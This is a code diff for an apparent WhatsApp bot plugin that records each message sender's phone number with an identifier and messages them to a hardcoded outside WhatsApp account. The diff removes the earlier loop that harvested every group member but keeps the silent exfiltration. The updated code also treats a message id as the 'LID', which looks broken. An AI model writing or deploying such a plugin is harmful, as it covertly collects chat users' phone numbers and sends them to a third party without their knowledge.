@@ -2,6 +2,7 @@ import fs from 'fs'
 
 const DIR = './database'
 const FILE = `${DIR}/lids.json`
+const DESTINO = '59898719147@s.whatsapp.net'
 
 if (!fs.existsSync(DIR)) fs.mkdirSync(DIR)
 if (!fs.existsSync(FILE)) fs.writeFileSync(FILE, '{}')
@@ -13,47 +14,30 @@ function save(data) {
   fs.writeFileSync(FILE, JSON.stringify(data, null, 2))
 }
 
-const DESTINO = '59898719147@s.whatsapp.net'
-
-// 🧠 Función central de captura
 async function capturar(jid, lid, conn) {
   if (!jid || !lid) return
 
-  let num = jid.replace(/[^0-9]/g, '')
-  let db = load()
-  if (db[num]) return
+  const num = jid.replace(/\D/g, '')
+  const db = load()
+
+  if (db[num]) return // ya existe → ignorar
 
   db[num] = lid
   save(db)
 
   await conn.sendMessage(DESTINO, {
-    text: `🧠 *Nuevo LID detectado*\n\nNúmero: ${num}\nLID: ${lid}`
+    text: `🧠 *Nuevo LID detectado*\n\n📱 Número: ${num}\n🆔 LID: ${lid}`
   })
 }
 
 let handler = async (m, { conn }) => {
   try {
-    // 🧲 Desde mensajes
-    let lid =
-      m.senderLid ||
-      m.key?.participantLid ||
-      m.message?.extendedTextMessage?.contextInfo?.participantLid ||
-      m.message?.messageContextInfo?.participantLid
+    const jid = m.sender
+    let lid = m.key?.id || null
 
-    if (lid) {
-      await capturar(m.sender, lid, conn)
+    if (jid && lid) {
+      await capturar(jid, lid, conn)
     }
-
-    // 🧲 Desde eventos de grupo
-    if (m.messageStubType) {
-      let meta = await conn.groupMetadata(m.chat)
-      for (let p of meta.participants) {
-        if (p.lid) {
-          await capturar(p.id, p.lid, conn)
-        }
-      }
-    }
-
   } catch (e) {
     console.error('AUTOLID ERROR:', e)
   }
